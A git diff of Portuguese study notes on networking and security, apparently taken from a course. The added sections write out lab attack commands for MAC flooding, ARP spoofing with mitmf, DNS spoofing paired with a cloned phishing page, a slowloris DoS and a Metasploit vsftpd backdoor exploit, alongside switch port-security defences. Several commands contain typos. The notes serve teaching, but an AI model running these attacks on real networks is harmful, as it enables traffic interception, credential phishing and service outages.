@@ -2,12 +2,12 @@ $ ping       => Verifica a conectividade no nível de IP para outro computador T
 $ ipconfig   => Exibe todos os valores atuais de configuração de rede TCP/IP e atualiza as configurações de protocolo DHCP e DNS (sistema de nomes de domínio). Usado sem parâmetros, o ipconfig exibe endereços IPv4 (protocolo IP versão 4) e IPv6, máscara de sub-rede e gateway padrão para todos os adaptadores.
                 TTL: O TTL seria uma informação dentro do pacote do IP que informa qual é a máxima quantidade de hops que minha informação pode passar antes de ser descartada. É a quantidade de máquinas que ela vai poder passar no caminho.
 $ ipconfig /all => Exibe mais informações, inclusive o número de série da minha placa de Rede (MAC ou Endereço Físico) usado no protocolo ARP do aparelho Switch
-$ tracert -d => O traceroute seria usado para verificar a rota que minha informação percorreu até chegar o destino. (traceroute -n no linux)
+$ tracert -d    => O traceroute seria usado para verificar a rota que minha informação percorreu até chegar o destino. (traceroute -n no linux)
                 Output: "*" Quando nós temos uma máquina que retornou (*) e passou a informação para uma próxima máquina, isso provavelmente indica que o administrador dessa máquina desabilitou a resposta ao nosso chamado. O que acontece seria que esse tipo de teste pode ser interpretado como uma tentativa de “scanear” possíveis portas abertas e vulnerabilidades que possam existir, caso seja usado por um usuário malicioso, pode ser usada como uma forma de reconhecimento da rede dessa possível vítima para que assim possa explorar possíveis falhas.
-$ nslookup   => Exibe informações que você pode usar para diagnosticar a infraestrutura do DNS (Sistema de Nomes de Domínio). Antes de usar essa ferramenta, você deve estar familiarizado com o trabalho do DNS. A ferramenta de linha de comando nslookup estará disponível somente se você tiver instalado o protocolo TCP/IP.
+$ nslookup      => Exibe informações que você pode usar para diagnosticar a infraestrutura do DNS (Sistema de Nomes de Domínio). Antes de usar essa ferramenta, você deve estar familiarizado com o trabalho do DNS. A ferramenta de linha de comando nslookup estará disponível somente se você tiver instalado o protocolo TCP/IP.
 $ ping 127.0.0.1 || ping localhost => É um endereço interno da placa de rede, usado para testar se os protocolos TCP/IP estão funcionando. Ele é conhecido como endereço de loopback, pois o sinal é enviado e recebido por ele mesmo.
-$ 
-$ 
+$ macof -i eth0 => O comando macof, se refere a overflow de endereços mac. É preciso informar em que interface ( -i) esse ataque será realizado. No nosso caso, temos a eth0, a placa de rede que está conectada ao switch no programa de emulação. Ao dar enter, ele começará a mandar uma infinidade de endereços para o switch, a fim de lotar a memória e fazer com que ele trabalhe como um switch, podendo assim pegarmos informações de pacotes com o wireshark
+$ arp -a        => Ver quais endereços MAC estão salvou para serem usados pelo ARP
 $ 
 $ 
 $ 
@@ -68,6 +68,14 @@ $
        * O endereço FF-FF-FF-FF-FF-FF será interpretado como sendo um endereço broadcast e será passado para todas as portas do Switch com exceção da porta a qual enviou essa informação
        * No caso de todos os Switches estarem configurados com a prioridade padrão 32.768. Qual será o critério que o protocolo do STP irá adotar para eleger o Switch Root? Uma vez que as prioridades do Switch estiverem configuradas com o mesmo valor padrão, o Switch Root será o Switch que tiver o menor endereço MAC. A porta root seria a porta que os outros Switches definiram como sendo a melhor porta de acesso ao Switch Root. Os modos de operação das portas do Switch Root seriam no modo Designado.
        * A análise que o protocolo STP realiza para eleger o Switch Root seria através dos valores de prioridade e endereço MAC presentes dentro do protocolo BPDU. Esse conjunto de valores de prioridade e endereço MAC é conhecido como Bridge-ID. O primeiro critério que o STP irá analisar será o valor de prioridade, o Switch que apresentar menor prioridade será eleito como Root. Caso ocorra um empate entre as prioridades, o Switch irá analisar os endereços MAC e o que apresentar o menor endereço MAC é que será eleito como Root.
+         $ show mac-adrress-table => ver todos os endereços MAC salvos na memória
+       * Evitando ataque de lotação de memória com endereços MAC:
+         $ configure terminal
+         $ interface fa0/2
+         $ switchport mode access
+         $ switchport port-security mac-address 00E0.B0AE.A127 => com isso habilitamos somente um endereço MAC nesta porta, caso um novo computador tente enviar informações a porta será desligada.
+         $ show port-security interface fa0/2
+         $ 
 !VLAN no Switch:
        * Uma rede local virtual, normalmente denominada de VLAN, é uma rede logicamente independente. Várias VLANs podem coexistir em um mesmo comutador, de forma a dividir uma rede local em mais de uma rede, criando domínios de broadcast separados
        * As Vlans (Virtual Lans) são usadas para segmentação de redes e priorização de tráfego. Hoje em dia as redes corporativas trafegam diferentes tipos de dados em suas redes, como por exemplo, podemos ter tráfego de dados, vídeo e voz e acaba sendo necessário lidar com esses diferentes tipos de tráfego de uma maneira a priorizar um sobre o outro.
@@ -360,15 +368,71 @@ $
         $ 2002:0BAA:0000:0000::CCCC/64
         $ 2002:0BAA:0000:0000::BBBB
 !OSI:
-    Ver: https://www.alura.com.br/artigos/conhecendo-o-modelo-osi
+      Ver: https://www.alura.com.br/artigos/conhecendo-o-modelo-osi
          https://pt.wikipedia.org/wiki/Protocolo_(ci%C3%AAncia_da_computa%C3%A7%C3%A3o)
 !SSID:
-    O SSID (Service Set Identifier) é um texto de até 32 caracteres que identifica as redes sem fio. É esse nome que os dispositivos utilizam para se conectar. Cada ponto de acesso tem seu SSID que o identifica na rede. Em alguns casos, podemos ter na mesma rede vários pontos de acesso com o mesmo SSID. Neste caso, é comum ouvir o termo ESSID (Extended Service Set ID). No primeiro curso de redes vimos que existem os endereços IPs que os computadores utilizam para se comunicar e, além dos endereços IPs, existem os endereços MAC. Esses endereços são fixos e associados a placa de rede do dispositivo. Quando utilizamos vários SSID na mesma rede, as máquinas utilizam o endereço MAC para saber qual o access point que estão conectadas. Em redes sem fio, isso é chamado de BSSID (Basic Service Set ID). O BSSID nada mais é do que o endereço MAC do ponto de acesso. Mesmo sem ter mais de um access point com o mesmo nome, os dispositivos sempre utilizam o BSSID para realizar a comunicação com o ponto de acesso.
-    Ver: https://www.lifewire.com/wireless-standards-802-11a-802-11b-g-n-and-802-11ac-816553
+      O SSID (Service Set Identifier) é um texto de até 32 caracteres que identifica as redes sem fio. É esse nome que os dispositivos utilizam para se conectar. Cada ponto de acesso tem seu SSID que o identifica na rede. Em alguns casos, podemos ter na mesma rede vários pontos de acesso com o mesmo SSID. Neste caso, é comum ouvir o termo ESSID (Extended Service Set ID). No primeiro curso de redes vimos que existem os endereços IPs que os computadores utilizam para se comunicar e, além dos endereços IPs, existem os endereços MAC. Esses endereços são fixos e associados a placa de rede do dispositivo. Quando utilizamos vários SSID na mesma rede, as máquinas utilizam o endereço MAC para saber qual o access point que estão conectadas. Em redes sem fio, isso é chamado de BSSID (Basic Service Set ID). O BSSID nada mais é do que o endereço MAC do ponto de acesso. Mesmo sem ter mais de um access point com o mesmo nome, os dispositivos sempre utilizam o BSSID para realizar a comunicação com o ponto de acesso.
+      Ver: https://www.lifewire.com/wireless-standards-802-11a-802-11b-g-n-and-802-11ac-816553
+Canais de Wifi:
+      Ver: https://www.microsoft.com/pt-br/p/wifi-analyzer/9nblggh33n0n?activetab=pivot:overviewtab
 
-
-
-
-
-
+!WEP: 
+      * WEP significa Wired Equivalent Privacy, e foi introduzido na tentativa de dar segurança durante o processo de autenticação, proteção e confiabilidade na comunicação entre os dispositivos Wireless.
+      * Ele possui o pobrema de ter seu sinal interceptado
+!WPA: 
+      * WPA (Wi-Fi Protected Access) é um protocolo de comunicação via rádio. É um protocolo WEP melhorado. Também chamado de WEP2, ou TKIP (Temporal Key Integrity Protocol), essa primeira versão do WPA (Wi-Fi Protected Access) surgiu de um esforço conjunto de membros da Wi-Fi Aliança e de membros do IEEE, empenhados em aumentar o nível de segurança das redes sem fio ainda no ano de 2003, combatendo algumas das vulnerabilidades do WEP.
+      Ver: https://pt.wikipedia.org/wiki/WPA2_(AES)
+!Firewall:
+      * O firewall é usado para dividir uma rede segura (rede interna) de uma rede não segura(por exemplo, a internet) e podemos assim controlar o tráfego que é permitido ou negado entre a rede interna e a rede externa. De forma geral, um usuário que esteja na rede interna poderá acessar recursos que estão na rede externa, porém um usuário da rede externa não terá permissão de acessar recursos da rede interna.
+      * A região desmilitarizada (DMZ) seria a região na qual temos recursos que devem ser acessados por usuários da internet. Dessa forma, conseguimos isolar essa região de recursos que precisam ser acessados externamente dos recursos que devem ser acessados somente por usuários de nossa rede interna.
+      * Os firewalls stateful conseguem guardar em sua memória informações das requisições internas que foram iniciadas. Quando ocorre um retorno desse pacote o firewall compara com sua tabela de memória elementos como endereço IP, portas de comunicação, etc e com isso consegue definir que trata-se de uma informação de retorno e com isso permitirá acesso a rede interna.
+      * O Reverse Shell seria a forma na qual o comando de uma máquina é obtida através de uma conexão da máquina alvo com a máquina de ataque. Ou seja, a conexão é estabelecida na direção reversa ao qual o ataque é realizada. Esse tipo de ataque torna-se muito útil, pois é possível que equipamentos de segurança como o Firewall nos conceda permissão de acesso a rede interna uma vez que nosso pacote é um retorno a uma requisição que foi originada por um usuário interno a rede.
+!Man In the Middle (MITM):
+      * O ataque Man In The Middle consiste em explorar a forma sem estado (stateless) na qual o protocolo ARP trabalha. Dessa forma, um Hacker pode usar de ferramentas para enviar respostas desse protocolo com o intuito de manipular a tabela ARP de suas vítimas para ficar assim no meio da comunicação e visualizar o que é trafegado entre os dispositivos manipulados.
+        $ apt-get-install mitmf  => no kali linux
+        $ mitmf --arp --spoof --target [IP vítima] --gateway [IP roteador] -i [interface]    => ex: mitm --arp --spoof --target 192.168.121.171 --gateway 192.168.121.1 -i eth0
+        $ arp - a           => no pc da vítima antes e depois do ataque, veremos que o endereço MAC foi alterado
+!DNS Spoofing:
+      *  O ataque de DNS Spoofing consiste em alterar a tradução entre URL e endereço IP para que essa url seja redirecionada a um endereço IP de controle do Hacker.
+        $ git clone https://gitbub.com/trustedsec/social-engineer-toolkit.git  => no kali linux, baixamos uma ferramenta capaz de clonar páginas da web.
+        $ cd social-engineer-toolkit/
+        $ ./setoolkit
+        yes
+        set>1
+        set>2
+        set:webattack>3
+        /var/www/html  => site clonado estará aqui
+        $ cd /etc/mitmf
+        $ getit mitmd.conf
+        $ *.alura.com.br=192.168.121.172  => redirecionar o site da alura para aquele ip que contem a página clonada
+        $ mitmf --arp --spoof --target [IP vítima] --gateway [IP roteador] -i [interface] --dns   => ex: mitmf --arp --spoof --target 192.168.121.171 --gateway 192.168.121.1 -i eth0 --dns
+!DoS (Denial of Service):
+      * Um ataque de negação de serviço ou em inglês Denial Of Service (DoS) ocorre quando temos um usuário que utiliza de recursos para causar uma sobrecarga em um sistema com o principal objetivo de torná-lo indisponível para outros usuários.
+      * Equipamentos que temos nas redes são por exemplo o Intrusion Detection System (IDS) que recebe cópias desse tráfego e caso alguma anomalia seja detectada, o equipamento manda alarmes para que assim os administradores da rede possam saber o ocorrido e procurar uma solução. Outra solução seria a utilização de equipamentos como o Intrusion Prevention System (IPS) que é capaz de detectar anomalias no tráfego e impedir que esse tráfego seja propagado para outros pontos da rede.
+      * O Intrusion Detection System (IDS) recebe apenas cópias dos tráfego, dessa forma, ele não é capaz de impedir que um ataque seja propagado para outros pontos da nossa rede. Ele irá encaminhar alarmes para que possamos assim saber dos problemas que foram detectados e encontrar soluções.
+      * O Intrusion Prevention System (IPS) é conectado diretamente na rede, dessa forma, ao analisar algum tipo de anomalia o IPS é capaz de impedir que esse tráfego seja propagado para outros pontos da minha rede.
+        $ git clone https://github.com/llaera/slowloris.pl.git  => no kali linux, baixamos uma ferramenta capaz de sobrecarregar um servidor
+        $ cd slowloris.pl/
+        $ chmod +x slowloris.pl
+        $ ./slowloris.pl
+        $ perl ./slowloris.pl -dns [IP servidor] -timeout 1   => executa o ataque
+!DDoS (Distributed Denial of Service):
+      * O ataque DDoS (Distributed Denial of Service) consiste em tirar a concentração do ataque em um usuário, como é feito no ataque de DoS e distribuir o ataque por vários usuários. Isso pode ser obtido por exemplo quando usuários fazem download de arquivos infectados. Uma vez que tais máquinas foram infectadas, o Hacker poderá controlá-las para que possa assim iniciar um ataque distribuído contra um serviço. O objetivo de tal ataque seria de causar uma "saturação" no link do alvo e com isso torná-lo indisponível para que outros usuários acessem o serviço.
+      * Uma botnet é um grupo de máquinas que foram comprometidas de alguma forma (por exemplo vírus, malware, etc). Tais máquinas infectadas passam a ser usadas por hackers para fazerem ataques contra um determinado serviço a fim de torná-lo indisponível. Pelo fato de termos várias máquinas atuando nesse ataque, chamamos esse de um ataque de negação de serviços distribuído (DDoS).
+      * 
+!Nmap:
+      * Nmap é um software livre que realiza port scan desenvolvido pelo Gordon Lyon, autoproclamado hacker "Fyodor". É muito utilizado para avaliar a segurança dos computadores, e para descobrir serviços ou servidores em uma rede de computadores.
+        $ nmap -A [IP do servidor]
+        $ nmap -A -T4 -Pn 192.168.0.8      => Exibe todas as portas e quais processos elas estão rodando
+        Ver: https://nmap.org/docs.html
+!Kali Linux o Metasploit:
+      * O Projeto Metasploit é um projeto de segurança de computadores que fornece informações sobre vulnerabilidades de segurança e ajuda em testes de penetração e desenvolvimento de assinaturas IDS. É propriedade da Rapid7, empresa de segurança sediada em Boston, Massachusetts.
+        $ use <exploit>  => ex:  exploit/unix/ftp/vsftpd_234_backdoor
+        $ set RHOST [IP do servidor]
+        $ exploit
+!Nessus:
+      * Nessus Cloud é um programa de verificação de falhas/vulnerabilidades de segurança. Ele é composto por um cliente e servidor, sendo que o scan propriamente dito é feito pelo servidor.
+        $ 
+        $ 
+        $  
 
